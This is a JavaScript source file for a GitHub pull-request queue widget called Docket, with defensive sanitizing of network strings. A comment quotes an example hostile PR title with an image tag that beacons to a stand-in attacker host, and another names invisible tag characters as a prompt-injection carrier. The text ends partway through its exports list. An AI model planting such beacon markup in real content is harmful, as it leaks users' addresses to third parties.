// Docket data layer: pure parse / classify / queue functions over the GitHub
// GraphQL search response and the on-disk state record. No QML and no network
// access here, so this same file loads unchanged inside Quickshell (via
// `import "Model.js" as Model`, which is where it actually runs in production)
// and inside node for the offline unit suite.
//
// A stock Omarchy install has NO node, python, or ruby on the graphical
// session PATH. Omarchy installs node through mise and mise shims are not
// exported to the session that launches Quickshell, so a plugin with a node
// poller installs cleanly and then silently never populates. Every line here
// must therefore stay ES5-compatible plain JS that the QML engine accepts: no
// require(), no template literals, no arrow functions, no let/const, no
// default parameters, no spread.

// ---------------------------------------------------------------- bounds
//
// Four separate caps, each doing a different job. MAX_BODY_CHARS is the real
// body bound: curl's --max-filesize carries the same number but only binds
// when the server sends Content-Length, and GitHub commonly chunks, so the
// load-bearing check is the length test below before JSON.parse.

var MAX_BODY_CHARS = 2000000   // cap on a response body before JSON.parse
var MAX_NODES = 100            // cap on nodes read out of one search field
var MAX_QUEUE = 60             // cap on items kept in the store
var MAX_ROWS = 12              // cap on rows rendered per lane
var MAX_TITLE_CHARS = 120      // cap applied by clean() to a PR title

// How many results to ask for per search field. issueCount and nodes.length
// disagree on a busy account (88 results, 50 nodes), so the badge is always
// computed from the rows we actually hold, never from issueCount. See counts().
// What issueCount IS used for is honesty: fetchNoticeText() renders the
// shortfall so a truncated page can never be silently presented as the whole
// docket.
var PAGE_SIZE = 50

// How long a drain stamp or a notified id survives after it was last seen in a
// live result set. Presence-based pruning treats one transient shrink of the
// result set (a partial GraphQL envelope, a page-size cut) as "gone forever"
// and reverts the user's mark-done; a time bound cannot.
var STAMP_RETENTION_MS = 7 * 24 * 3600000

// The lanes, in docket order. Reviewing someone else outranks unblocking
// yourself, because the other person is stalled and you are not.
var LANE_REVIEW = "review"
var LANE_BLOCKED = "blocked"
var LANE_READY = "ready"

var DEFAULT_SLA_HOURS = 24
var MIN_SLA_HOURS = 1
var MAX_SLA_HOURS = 168

// The complete set of strings that may ever appear in the persisted
// lastError field. Nothing derived from a response body, curl stderr, or a
// GraphQL message is allowed here: an error path is the most natural-looking
// place for a token or a private repo name to leak into a file a user will
// paste into a bug report. tests/model.test.js pins this set.
var ERROR_CODES = ["", "not connected", "fetch failed", "rate limited", "api error"]

// ------------------------------------------------------------ sanitizing

function num(v) {
  var n = Number(v)
  return isNaN(n) ? 0 : n
}

// Every string that came off the network passes through here before it can
// reach a QML Text, a tooltip, or a notification positional. Five separate
// hazards, each stripped deliberately:
//
//   [<>]          Qt's default Text.AutoText promotes markup-looking strings
//                 to rich text, and Qt's rich text engine FETCHES remote
//                 resources. A PR titled <img src="http://attacker/?u=me">
//                 would otherwise beacon from the user's IP on render. Every
//                 Text also sets textFormat: Text.PlainText; the two defenses
//                 are redundant on purpose, do not remove either.
//   controls      \x1b[ in a title writes ANSI escapes into whatever terminal
//                 or log omarchy-notification-send output reaches.
//   bidi marks    U+202E and friends render "deploy-prod approved" backwards
//                 (CVE-2021-42574 class). In a REVIEW queue that is a
//                 decision-influencing spoof, not a cosmetic bug.
//   tag chars     U+E0000..U+E007F are invisible everywhere and are the
//                 prompt-injection carrier if a title ever reaches an LLM.
//                 Written as the surrogate pair so no /u flag is needed,
//                 which Quickshell's JS engine does not reliably support.
//   length cap    A 5000-character unbroken title can wedge the bar layout
//                 and stall a compositor frame. Capped at the model layer so
//                 an oversized string never reaches a layout pass at all.
//
// Accepted cost: a PR title legitimately containing "<3" or "-->" loses
// characters. Correctness of rendering loses to safety of rendering. Do not
// "fix" that by loosening the filter.
function clean(value, max) {
  var s = String(value === undefined || value === null ? "" : value)
  s = s.replace(/[<>]/g, "")
    .replace(/[\x00-\x1f\x7f]/g, "")
    .replace(/[​-‏‪-‮⁦-⁩]/g, "")
    .replace(/[\u061c\u180e\u2060\u2028\u2029\ufeff]/g, "")
    .replace(/\uDB40[\uDC00-\uDC7F]/g, "")
  var cap = max || 64
  if (s.length > cap) {
    s = s.slice(0, cap)
    // Slicing can land between a surrogate pair and emit a lone high
    // surrogate, which renders as a replacement box and is not well-formed
    // UTF-16 for anything downstream. Drop it.
    var last = s.charCodeAt(s.length - 1)
    if (last >= 0xd800 && last <= 0xdbff) s = s.slice(0, s.length - 1)
  }
  return s
}

// Strip-to-charset, bail on empty, then REBUILD. Never validate-and-pass
// through: a rejected character must not be able to survive inside a field
// somebody forgot to check.
function prUrl(nameWithOwner, number) {
  var parts = String(nameWithOwner || "").split("/")
  if (parts.length !== 2) return ""
  var o = String(parts[0]).replace(/[^A-Za-z0-9-]/g, "")
  var r = String(parts[1]).replace(/[^A-Za-z0-9._-]/g, "")
  var n = String(number === undefined || number === null ? "" : number).replace(/[^0-9]/g, "")
  if (!o || !r || !n) return ""
  if (o.length > 39 || r.length > 100 || n.length > 10) return ""
  return "https://github.com/" + o + "/" + r + "/pull/" + n
}

// The single pattern that gates a URL into a notification --exec value, which
// Omarchy dispatches through `bash -lc "<value>"`. It contains no quote, no
// backslash, no dollar, no backtick, and no space, which is exactly why
// single-quoting the URL cannot be escaped out of. Re-tested at the point of
// use in Service.qml, not only here, so an upstream regression removes the
// click action instead of shipping an injectable one.
var PR_URL_RE = /^https:\/\/github\.com\/[A-Za-z0-9-]{1,39}\/[A-Za-z0-9._-]{1,100}\/pull\/[0-9]{1,10}$/

function isSafePrUrl(u) {
  return PR_URL_RE.test(String(u || ""))
}

// Does the name we DISPLAY disagree with the link we would BUILD from it?
//
// This deliberately does NOT ask "did clean() change the string". clean()
// strips angle brackets, controls, bidi marks, and tag characters, and none of
// those is a homoglyph, so for a Cyrillic lookalike like
// github.com/mi<cyrillic-c>rosoft clean() is a no-op and a clean()-derived test
// answers false. Meanwhile prUrl() drops that same codepoint and builds a link
// to mirosoft, an owner an attacker can register. Display and destination then
// disagree with no marker at all, in a UI whose entire job is deciding what to
// trust.
//
// So the test IS the divergence: anything outside printable ASCII, or any
// character prUrl's owner/repo charsets would drop, means the rendered name is
// not the name the link goes to.
function isSpoofy(value) {
  var s = String(value || "")
  if (s === "") return false
  if (/[^\x20-\x7e]/.test(s)) return true
  var parts = s.split("/")
  if (parts.length !== 2) return true
  return parts[0].replace(/[^A-Za-z0-9-]/g, "") !== parts[0]
    || parts[1].replace(/[^A-Za-z0-9._-]/g, "") !== parts[1]
}

// ----------------------------------------------------------- the request
//
// One POST returns both inboxes. Measured against the live API on 2026-08-21:
// rateLimit.cost is 1 at first:25 and 2 at first:50, out of a 5000-point
// hourly budget, so this plugin's 15-minute cadence at PAGE_SIZE 50 spends 8
// points an hour, or 0.16 percent. The REST search API was rejected for this:
// it needs two requests against a 30-per-MINUTE budget, carries no ETag (a
// conditional request still returns 200 and still spends quota), and has no
// CI, review-decision, or mergeable field anywhere in a search item.

function searchFields(first) {
  var n = num(first) > 0 ? Math.floor(num(first)) : PAGE_SIZE
  var body = "" +
    "issueCount " +
    "pageInfo { hasNextPage } " +
    "nodes { ... on PullRequest { " +
    "number title isDraft createdAt updatedAt " +
    "author { login __typename } " +
    "repository { nameWithOwner isPrivate isArchived } " +
    "isCrossRepository reviewDecision mergeable " +
    "commits(last: 1) { nodes { commit { statusCheckRollup { state } } } } " +
    "latestOpinionatedReviews(first: 10, writersOnly: false) { nodes { state } } " +
    "} }"
  return { first: n, body: body }
}

// archived:false is load-bearing: without it the queue carries pull requests
// in archived repositories that can never be acted on (it moved the measured
// review-requested count from 93 to 88 on the account this was built against).
//
// sort:updated-asc, NOT updated-desc. On an account with more than PAGE_SIZE
// matches GitHub returns one page and drops the rest, so the sort decides WHICH
// results are unreachable. Descending returns the newest and silently discards
// the oldest, which are exactly the obligations a docket exists to surface: a
// review request last touched three weeks ago would never be fetched, never get
// an overdue dot, and never reach counts().overdue, while the pill read "4
// overdue" over 38 genuinely overdue reviews. Ascending returns the oldest page,
// which matches what this widget claims to be about, and pageInfo.hasNextPage is
// carried into the parse result so the shortfall is rendered rather than hidden.
function graphqlQuery(first) {
  var f = searchFields(first)
  return "query {" +
    " rateLimit { cost remaining }" +
    " reviewRequested: search(type: ISSUE, first: " + f.first +
    ", query: \"is:open is:pr review-requested:@me archived:false sort:updated-asc\") { " + f.body + " }" +
    " mine: search(type: ISSUE, first: " + f.first +
    ", query: \"is:open is:pr author:@me archived:false sort:updated-asc\") { " + f.body + " }" +
    " }"
}

function graphqlBody(first) {
  return JSON.stringify({ query: graphqlQuery(first) })
}

// ------------------------------------------------------------- normalize

// statusCheckRollup is null when the head commit carries no checks at all
// (9 of 50 measured nodes). Null is NOT green. Rendering it as a tick is a
// false all-clear, so it gets its own state and never satisfies the
// ready-to-merge test.
function rollupState(node) {
  var commits = node && node.commits && node.commits.nodes
  if (!commits || !commits.length) return "none"
  var c = commits[0] && commits[0].commit
  var roll = c && c.statusCheckRollup
  if (!roll || !roll.state) return "none"
  var s = String(roll.state)
  if (s === "FAILURE" || s === "ERROR") return "red"
  if (s === "SUCCESS") return "green"
  if (s === "PENDING" || s === "EXPECTED") return "pending"
  return "none"
}

// reviewDecision: null does NOT mean "nobody has weighed in". It means the
// repository has no branch-protection review requirement, and 30 of 50
// measured nodes were null for that reason alone. Treating null as "no
// reviews" hides real CHANGES_REQUESTED reviews, so fall back to the actual
// per-reviewer verdicts. This is also why the server-side `review:` search
// qualifier is unusable: on a repo without required reviews everything
// collapses into review:none, and a widget built on it ships permanently
// empty while looking like it works.
function effectiveDecision(node) {
  var d = node && node.reviewDecision
  if (d === "APPROVED" || d === "CHANGES_REQUESTED" || d === "REVIEW_REQUIRED") return d
  var revs = node && node.latestOpinionatedReviews && node.latestOpinionatedReviews.nodes
  if (!revs || !revs.length) return ""
  var approved = false
  for (var i = 0; i < revs.length; i++) {
    var st = revs[i] && revs[i].state
    if (st === "CHANGES_REQUESTED") return "CHANGES_REQUESTED"
    if (st === "APPROVED") approved = true
  }
  return approved ? "APPROVED" : ""
}

// mergeable is computed lazily by GitHub: a cold ask returns UNKNOWN and the
// real answer arrives on a later poll. UNKNOWN is never cached as fine, and
// never satisfies the ready-to-merge test.
function mergeState(node) {
  var m = node && node.mergeable
  if (m === "MERGEABLE" || m === "CONFLICTING") return m
  return "UNKNOWN"
}

// Attribute a pull request to its BASE repository. GraphQL's
// repository.nameWithOwner is already the base; using the head repo would
// scatter fork PRs under contributor names (verified on a real fork PR whose
// head repo differed from its base).
function normalizeNode(node, lane) {
  if (!node || !node.repository || !node.repository.nameWithOwner) return null
  if (node.number === undefined || node.number === null) return null
  var repo = clean(node.repository.nameWithOwner, 140)
  var url = prUrl(node.repository.nameWithOwner, node.number)
  if (!url) return null
  var login = node.author && node.author.login ? String(node.author.login) : ""
  return {
    guid: repo + "#" + String(node.number).replace(/[^0-9]/g, ""),
    repo: repo,
    repoSpoofy: isSpoofy(node.repository.nameWithOwner),
    number: num(node.number),
    title: clean(node.title, MAX_TITLE_CHARS),
    url: url,
    author: clean(login, 39),
    // Bot detection reads __typename, never a login string. Search returns a
    // bare "dependabot" while the reviews endpoint returns "greptile-apps[bot]",
    // so matching on the bracketed form is unreliable across endpoints.
    isBot: node.author && node.author.__typename === "Bot",
    isDraft: node.isDraft === true,
    isPrivate: node.repository.isPrivate === true,
    isFork: node.isCrossRepository === true,
    createdMs: Date.parse(String(node.createdAt || "")) || 0,
    updatedMs: Date.parse(String(node.updatedAt || "")) || 0,
    decision: effectiveDecision(node),
    ci: rollupState(node),
    mergeable: mergeState(node),
    lane: lane,
    reason: ""
  }
}

// --------------------------------------------------------------- parsing

function emptyParse() {
  return {
    valid: false, error: "api error", reviewRequested: [], mine: [], cost: 0,
    reviewTotal: 0, reviewFetched: 0, reviewTruncated: false,
    mineTotal: 0, mineFetched: 0, mineTruncated: false
  }
}

function fieldMeta(field) {
  var nodes = field && field.nodes && field.nodes.length ? field.nodes.length : 0
  return {
    total: field ? num(field.issueCount) : 0,
    fetched: nodes,
    truncated: !!(field && field.pageInfo && field.pageInfo.hasNextPage === true)
  }
}

// Bounded before JSON.parse, tolerant of a non-JSON body. GraphQL occasionally
// answers with an nginx 502 HTML page rather than JSON; a parser that assumes
// JSON crashes the widget on a routine blip, so this returns the zero object
// and the service keeps showing its last good snapshot with a stale timestamp.
function parseSearch(raw) {
  var s = String(raw || "")
  if (!s || s.length > MAX_BODY_CHARS) return emptyParse()
  var data
  try { data = JSON.parse(s) } catch (e) { return emptyParse() }
  if (!data || !data.data) return emptyParse()
  var d = data.data
  // BOTH fields, not either. A partial GraphQL envelope answers 200 with one
  // search field null and an errors array beside it, which is a routine
  // SERVICE_UNAVAILABLE shape. Accepting it as valid presents an absent lane as
  // an EMPTY lane, and everything downstream that reasons about absence (the
  // pill, the counts, the prune passes) then acts on a lane that was never
  // actually reported. Reject it and keep the last good snapshot instead.
  if (!d.reviewRequested || typeof d.reviewRequested !== "object") return emptyParse()
  if (!d.mine || typeof d.mine !== "object") return emptyParse()
  var rm = fieldMeta(d.reviewRequested)
  var mm = fieldMeta(d.mine)
  var out = {
    valid: true,
    error: "",
    reviewRequested: nodesOf(d.reviewRequested, LANE_REVIEW),
    mine: nodesOf(d.mine, ""),
    cost: d.rateLimit ? num(d.rateLimit.cost) : 0,
    reviewTotal: rm.total, reviewFetched: rm.fetched, reviewTruncated: rm.truncated,
    mineTotal: mm.total, mineFetched: mm.fetched, mineTruncated: mm.truncated
  }
  return out
}

// The truncation line. Ascending order means the page we hold is the OLDEST
// results, so what is missing is newer than everything on screen. Rendering the
// shortfall is what keeps "N on your docket" from quietly meaning "N of 88".
function fetchNoticeText(parsed) {
  if (!parsed || !parsed.valid) return ""
  var extra = 0
  if (parsed.reviewTruncated) extra += Math.max(0, num(parsed.reviewTotal) - num(parsed.reviewFetched))
  if (parsed.mineTruncated) extra += Math.max(0, num(parsed.mineTotal) - num(parsed.mineFetched))
  if (extra <= 0) return ""
  return extra + " newer not fetched"
}

function nodesOf(field, lane) {
  var out = []
  if (!field || !field.nodes || !field.nodes.length) return out
  for (var i = 0; i < field.nodes.length && out.length < MAX_NODES; i++) {
    var item = normalizeNode(field.nodes[i], lane)
    if (item) out.push(item)
  }
  return out
}

// ------------------------------------------------------------ classifying

// Your own pull request is on your docket only when YOU are the one who has
// to move next. Everything else (waiting on a reviewer, waiting on CI) is
// somebody else's turn and belongs nowhere on a queue named "waiting on me".
//
// Deliberately client-side. The server-side `review:` and `status:` search
// qualifiers only reflect branch-protection-decided state: measured live,
// `author:@me review:changes_requested` returned 0 against 112 open authored
// pull requests, because those repos have no required-review rule. A naive
// implementation querying that ships an empty widget that looks healthy.
function classifyMine(item) {
  if (!item) return ""
  if (item.isDraft) return ""
  var reasons = []
  if (item.decision === "CHANGES_REQUESTED") reasons.push("changes requested")
  if (item.mergeable === "CONFLICTING") reasons.push("conflicts")
  if (item.ci === "red") reasons.push("checks failing")
  if (reasons.length) {
    item.reason = reasons.join(", ")
    return LANE_BLOCKED
  }
  if (item.decision === "APPROVED" && item.ci === "green" && item.mergeable === "MERGEABLE") {
    item.reason = "approved and green"
    return LANE_READY
  }
  return ""
}

function reviewReason(item) {
  if (!item) return ""
  var bits = []
  if (item.ci === "red") bits.push("checks failing")
  else if (item.ci === "none") bits.push("no checks")
  if (item.mergeable === "CONFLICTING") bits.push("conflicts")
  if (item.decision === "CHANGES_REQUESTED") bits.push("changes requested")
  return bits.join(", ")
}

// opts: { botPullRequests: "Hide"|"Show", myDrafts: "Hide"|"Show" }
function buildQueue(parsed, opts) {
  var o = opts || {}
  var hideBots = o.botPullRequests !== "Show"
  var showDrafts = o.myDrafts === "Show"
  var out = []
  var seen = {}
  var i
  var it

  for (i = 0; i < parsed.reviewRequested.length; i++) {
    it = parsed.reviewRequested[i]
    // A draft in the review lane is waiting on its author, not on you. Zero
    // of 50 measured review-requested nodes were drafts, so this costs
    // nothing and closes the case where a repo allows requesting review on one.
    if (it.isDraft) continue
    if (hideBots && it.isBot) continue
    it.lane = LANE_REVIEW
    it.reason = reviewReason(it)
    if (seen[it.guid]) continue
    seen[it.guid] = true
    out.push(it)
  }

  for (i = 0; i < parsed.mine.length; i++) {
    it = parsed.mine[i]
    if (it.isDraft && !showDrafts) continue
    var lane = classifyMine(it)
    if (it.isDraft && showDrafts && !lane) { lane = LANE_BLOCKED; it.reason = "draft" }
    if (!lane) continue
    it.lane = lane
    if (seen[it.guid]) continue
    seen[it.guid] = true
    out.push(it)
  }

  // Oldest obligation first. This is the whole point of a docket: the thing
  // that has been waiting on you longest is the thing you owe, and the
  // newest-first ordering every feed uses actively buries it.
  out.sort(function(a, b) { return a.updatedMs - b.updatedMs })
  return out.slice(0, MAX_QUEUE)
}

// -------------------------------------------------------------- draining
//
// A dismissal is bound to the pull request's updatedAt, not to its number.
// Draining a row hides it until the pull request actually changes; a new push,
// a new review, or a new comment mints a new stamp and puts it back on the
// docket. That is the difference between a queue and a mute button.

function stampOf(item) {
  if (!item) return ""
  return item.guid + "@" + String(num(item.updatedMs))
}

function isDrained(drained, item) {
  return !!(drained && drained[stampOf(item)])
}

function applyDrained(queue, drained) {
  var out = []
  for (var i = 0; i < queue.length; i++) {
    if (!isDrained(drained, queue[i])) out.push(queue[i])
  }
  return out
}

// Bound the drained map WITHOUT treating one poll's absence as "gone forever".
//
// Presence-based pruning looks correct and is not: any transient shrink of the
// result set erases user state. A lane that came back null, a row cut by the
// MAX_QUEUE slice, a page that happened not to include it, and the drain is
// deleted; on the next healthy poll the row returns to the docket and (with
// notifications on) fires a fresh toast for something the user dismissed hours
// ago. A keystroke must never be reverted by a poll.
//
// So each key carries the last time it was SEEN live, and an entry is dropped
// only after STAMP_RETENTION_MS of continuous absence. Legacy records stored a
// bare `true`; those are re-stamped rather than discarded.
function pruneStamps(map, liveKeys, nowMs) {
  var now = num(nowMs) || 0
  var out = {}
  var k
  for (k in map) {
    if (!map.hasOwnProperty(k)) continue
    if (!map[k]) continue
    if (liveKeys[k]) { out[k] = now; continue }
    // Old releases persisted a bare boolean. Number(true) is 1, which would
    // make a legacy dismissal look older than the retention window and erase
    // it immediately. Convert that legacy sentinel deliberately instead.
    var seen = map[k] === true ? 0 : num(map[k])
    if (seen <= 0) { out[k] = now; continue }      // legacy `true`
    if (now - seen < STAMP_RETENTION_MS) out[k] = seen
  }
  return out
}

function pruneDrained(drained, allItems, nowMs) {
  var live = {}
  for (var i = 0; i < allItems.length; i++) live[stampOf(allItems[i])] = true
  return pruneStamps(drained || {}, live, nowMs)
}

// ------------------------------------------------------------- the clock
//
// The wedge. Every other GitHub bar widget shows you which pull requests are
// waiting; none of them tell you which ones you are late on. Age is measured
// from updatedAt, so answering a review comment resets the clock honestly
// rather than punishing a long-running thread forever.

function clampSla(v) {
  var n = num(v)
  if (!(n > 0)) return DEFAULT_SLA_HOURS
  n = Math.floor(n)
  if (n < MIN_SLA_HOURS) return MIN_SLA_HOURS
  if (n > MAX_SLA_HOURS) return MAX_SLA_HOURS
  return n
}

function ageHours(thenMs, nowMs) {
  var t = num(thenMs)
  if (t <= 0) return 0
  var h = (num(nowMs) - t) / 3600000
  return h > 0 ? h : 0
}

function isOverdue(item, slaHours, nowMs) {
  if (!item) return false
  return ageHours(item.updatedMs, nowMs) >= clampSla(slaHours)
}

function ageText(thenMs, nowMs) {
  var t = num(thenMs)
  if (t <= 0) return ""
  var mins = Math.floor((num(nowMs) - t) / 60000)
  if (mins < 1) return "just now"
  if (mins < 60) return mins + "m"
  var hours = Math.floor(mins / 60)
  if (hours < 48) return hours + "h"
  return Math.floor(hours / 24) + "d"
}

// ageText returns a complete phrase ("just now") under a minute and a bare
// duration ("5m") above it, so the caller cannot template one sentence around
// both without producing "checked just now ago". Built here rather than at each
// call site so a unit test can pin it: this is the single most-often-read string
// in the plugin, in the exact moment the user is looking at it.
function checkedText(thenMs, nowMs) {
  var a = ageText(thenMs, nowMs)
  if (!a) return ""
  return a === "just now" ? "checked just now" : "checked " + a + " ago"
}

// --------------------------------------------------------- rows and pill

function laneRows(queue, lane, max) {
  var cap = num(max) > 0 ? num(max) : MAX_ROWS
  var out = []
  for (var i = 0; i < queue.length && out.length < cap; i++) {
    if (queue[i].lane === lane) out.push(queue[i])
  }
  return out
}

function counts(queue, slaHours, nowMs) {
  var c = {
    review: 0, blocked: 0, ready: 0, total: 0,
    overdue: 0, oldestMs: 0, oldestRepo: ""
  }
  if (!queue || !queue.length) return c
  for (var i = 0; i < queue.length; i++) {
    var it = queue[i]
    if (it.lane === LANE_REVIEW) c.review++
    else if (it.lane === LANE_BLOCKED) c.blocked++
    else if (it.lane === LANE_READY) c.ready++
    if (isOverdue(it, slaHours, nowMs)) c.overdue++
    // Skip a non-positive stamp on BOTH sides of the guard. With only the
    // second half guarded, one item whose timestamp failed Date.parse leaves
    // oldestMs pinned at 0 forever and oldestRepo overwritten by every
    // subsequent row, so the "oldest" is reported as the LAST item in the queue.
    if (it.updatedMs > 0 && (c.oldestMs === 0 || it.updatedMs < c.oldestMs)) {
      c.oldestMs = it.updatedMs
      c.oldestRepo = it.repo
    }
  }
  c.total = c.review + c.blocked + c.ready
  return c
}

// The contract that makes this a docket and not a nag: an empty string
// collapses the bar slot entirely. There is no zero badge, ever. A drained
// docket is indistinguishable from an uninstalled plugin, which is correct.
function pillText(c) {
  if (!c || c.total === 0) return ""
  if (c.overdue > 0) return c.overdue + " overdue"
  if (c.review > 0 && c.blocked === 0 && c.ready === 0) return c.review + " to review"
  if (c.blocked > 0 && c.review === 0 && c.ready === 0) return c.blocked + " blocked"
  if (c.ready > 0 && c.review === 0 && c.blocked === 0) return c.ready + " to merge"
  return c.total + " on your docket"
}

// A missing token and an empty docket are different states and must never
// look alike. Only the setup case renders a pill at all when the queue is
// empty, because it is the one empty state the user has to act on.
function setupPillText(configured) {
  return configured ? "" : "Docket: connect"
}

function tooltipText(c, configured, generatedAtMs, nowMs, lastError) {
  if (!configured) return "Docket needs a GitHub token. Run docket-login."
  if (!c || c.total === 0) return "Docket: clear"
  var parts = []
  if (c.review > 0) parts.push(c.review + " to review")
  if (c.blocked > 0) parts.push(c.blocked + " blocked on you")
  if (c.ready > 0) parts.push(c.ready + " ready to merge")
  var s = "Docket: " + parts.join(", ")
  if (c.overdue > 0) s += " (" + c.overdue + " overdue)"
  var checked = checkedText(generatedAtMs, nowMs)
  if (checked) s += " " + checked
  if (lastError) s += " [" + lastError + "]"
  return s
}

// ------------------------------------------------------------ error codes

// 401 and 403 are NOT the same remediation. GitHub answers 403 for primary
// rate-limit exhaustion and for secondary/abuse limits (its own docs list "403
// Forbidden or 429 Too Many Requests" for rate limiting), and the response body
// that would separate those from a revoked token is deliberately never surfaced.
// Mapping 403 to "not connected" sends a throttled user to re-mint a token,
// which does not help, and they see the same string afterwards. Both codes were
// already in ERROR_CODES, so the no-captured-output invariant is untouched.
function httpErrorCode(code) {
  var n = num(code)
  if (n === 200) return ""
  if (n === 401) return "not connected"
  if (n === 403 || n === 429) return "rate limited"
  if (n === 0) return "fetch failed"
  return "api error"
}

function isAllowedError(s) {
  var v = String(s === undefined || s === null ? "" : s)
  for (var i = 0; i < ERROR_CODES.length; i++) if (ERROR_CODES[i] === v) return true
  return false
}

// ------------------------------------------------------------ notifying

// Only items that are new to the docket notify, tracked by an id set rather
// than a timestamp comparison, because timestamps re-fire after a clock
// change. History is not news: the first successful poll marks everything
// seen and notifies zero times.
function newNotifiables(queue, notified) {
  var out = []
  if (!queue) return out
  for (var i = 0; i < queue.length; i++) {
    if (!notified || !notified[queue[i].guid]) out.push(queue[i])
  }
  return out
}

function pruneNotified(notified, queue, nowMs) {
  var live = {}
  for (var i = 0; i < queue.length; i++) live[queue[i].guid] = true
  return pruneStamps(notified || {}, live, nowMs)
}

function notificationHeadline(item) {
  if (!item) return "Docket"
  // author is "" whenever GitHub returned a null author: a deleted account (the
  // ghost user) or an app-authored pull request the Bot filter did not catch.
  // Unguarded this fires a desktop toast reading "@ needs your review", which is
  // the plugin's only outward-facing voice.
  if (item.lane === LANE_REVIEW)
    return item.author ? "@" + item.author + " needs your review" : "A pull request needs your review"
  if (item.lane === LANE_READY) return "Ready to merge"
  return "Blocked on you"
}

function notificationBody(item) {
  if (!item) return ""
  var s = item.repo + " #" + item.number + " " + item.title
  if (item.reason) s += " (" + item.reason + ")"
  return clean(s, 180)
}

// ------------------------------------------------------------ the record
//
// state.json is written by Service.qml (atomic, through FileView) and read by
// nothing inside this plugin: the panel binds to the service's live properties,
// not to the file. Its real audience is a human pasting it into a bug report and
// any external status-bar script that wants a summary. That audience is exactly
// why it carries NO item rows.
//
// It used to carry the whole queue, including rows from private repositories,
// while SECURITY.md described its contents as the login plus a token last-4 and
// called that "the entire diagnostic surface". A user following the document
// would have published their private repository inventory and private pull
// request titles. The record is now lane counts only, so the document and the
// file agree and there is nothing in it worth redacting.
//
// parseState still accepts a legacy record that carries `queue`, and still
// re-derives every URL from stripped pieces rather than trusting a stored one,
// because a hand-edited or stale file is exactly the input that must not be
// trusted. It returns the zero object on empty, oversized, unparseable, or
// wrong-shaped input.

function emptyInternal() {
  return { firstRun: true, setupSeen: false, drained: {}, notified: {} }
}

function emptyCounts() {
  return { review: 0, blocked: 0, ready: 0, total: 0, overdue: 0, drained: 0 }
}

function emptyState() {
  return {
    valid: false, configured: false, generatedAt: 0, queue: [],
    counts: emptyCounts(), fetchNotice: "", lastError: "",
    account: { login: "", last4: "" }
  }
}

function parseInternal(raw) {
  var s = String(raw || "")
  if (!s || s.length > MAX_BODY_CHARS) return emptyInternal()
  var d
  try { d = JSON.parse(s) } catch (e) { return emptyInternal() }
  if (!d || typeof d !== "object") return emptyInternal()
  var base = emptyInternal()
  return {
    firstRun: d.firstRun !== false,
    setupSeen: d.setupSeen === true,
    drained: d.drained && typeof d.drained === "object" ? d.drained : base.drained,
    notified: d.notified && typeof d.notified === "object" ? d.notified : base.notified
  }
}

function parseState(raw) {
  var s = String(raw || "")
  if (!s || s.length > MAX_BODY_CHARS) return emptyState()
  var data
  try { data = JSON.parse(s) } catch (e) { return emptyState() }
  if (!data || typeof data !== "object") return emptyState()
  var hasCounts = !!(data.counts && typeof data.counts === "object")
  if (!hasCounts && !Array.isArray(data.queue)) return emptyState()
  var queue = []
  if (Array.isArray(data.queue)) queue = parseQueueRows(data.queue)
  var c = emptyCounts()
  if (hasCounts) {
    c.review = num(data.counts.review)
    c.blocked = num(data.counts.blocked)
    c.ready = num(data.counts.ready)
    c.overdue = num(data.counts.overdue)
    c.drained = num(data.counts.drained)
    c.total = num(data.counts.total) || (c.review + c.blocked + c.ready)
  }
  var acct = data.account && typeof data.account === "object" ? data.account : {}
  return {
    valid: true,
    configured: data.configured === true,
    generatedAt: num(data.generatedAt),
    queue: queue,
    counts: c,
    fetchNotice: clean(data.fetchNotice, 40),
    lastError: isAllowedError(data.lastError) ? String(data.lastError || "") : "",
    // Only the last four characters of a token may ever land in a file. Cap
    // at 4 here as well, so a record hand-edited to carry more cannot render it.
    account: { login: clean(acct.login, 39), last4: clean(acct.last4, 4) }
  }
}

// Legacy shape only. Kept because a state.json written by an older build is a
// perfectly plausible input and must not crash the reader.
function parseQueueRows(rows) {
  var queue = []
  for (var i = 0; i < rows.length && queue.length < MAX_QUEUE; i++) {
    var it = rows[i]
    if (!it || !it.guid || !it.repo) continue
    var url = prUrl(it.repo, it.number)
    if (!url) continue
    queue.push({
      guid: clean(it.guid, 160),
      repo: clean(it.repo, 140),
      repoSpoofy: it.repoSpoofy === true,
      number: num(it.number),
      title: clean(it.title, MAX_TITLE_CHARS),
      url: url,
      author: clean(it.author, 39),
      isBot: it.isBot === true,
      isDraft: it.isDraft === true,
      isPrivate: it.isPrivate === true,
      isFork: it.isFork === true,
      createdMs: num(it.createdMs),
      updatedMs: num(it.updatedMs),
      decision: clean(it.decision, 24),
      ci: clean(it.ci, 8),
      mergeable: clean(it.mergeable, 16),
      lane: /^(review|blocked|ready)$/.test(String(it.lane)) ? String(it.lane) : LANE_REVIEW,
      reason: clean(it.reason, 60)
    })
  }
  return queue
}

if (typeof module !== "undefined") {
  module.exports = {
    MAX_BODY_CHARS: MAX_BODY_CHARS,
    MAX_NODES: MAX_NODES,
    MAX_QUEUE: MAX_QUEUE,
    MAX_ROWS: MAX_ROWS,
    MAX_TITLE_CHARS: MAX_TITLE_CHARS,
    PAGE_SIZE: PAGE_SIZE,
    LANE_REVIEW: LANE_REVIEW,
    LANE_BLOCKED: LANE_BLOCKED,
    LANE_READY: LANE_READY,
    DEFAULT_SLA_HOURS: DEFAULT_SLA_HOURS,
    MIN_SLA_HOURS: MIN_SLA_HOURS,
    MAX_SLA_HOURS: MAX_SLA_HOURS,
    ERROR_CODES: ERROR_CODES,
    PR_URL_RE: PR_URL_RE,
    num: num,
    clean: clean,
    prUrl: prUrl,
    isSafePrUrl: isSafePrUrl,
    isSpoofy: isSpoofy,
    fetchNoticeText: fetchNoticeText,
    checkedText: checkedText,
    pruneStamps: pruneStamps,
    emptyCounts: emptyCounts,
    STAMP_RETENTION_MS: STAMP_RETENTION_MS,
    searchFields: searchFields,
    graphqlQuery: graphqlQuery,
    graphqlBody: graphqlBody,
    rollupState: rollupState,
    effectiveDecision: effectiveDecision,
    mergeState: mergeState,
    normalizeNode: normalizeNode,
    emptyParse: emptyParse,
    parseSearch: parseSearch,
    classifyMine: classifyMine,
    reviewReason: reviewReason,
    buildQueue: buildQueue,
    stampOf: stampOf,
    isDrained: isDrained,
    applyDrained: applyDrained,
    pruneDrained: pruneDrained,
    clampSla: clampSla,
    ageHours: ageHours,
    isOverdue: isOverdue,
    ageText: ageText,
    laneRows: laneRows,
    counts: counts,
    pillText: pillText,
    setupPillText: setupPillText,
    tooltipText: tooltipText,
    httpErrorCode: httpErrorCode,
    isAllowedError: isAllowedError,
    newNotifiables: newNotifiables,
    pruneNotified: pruneNotified,
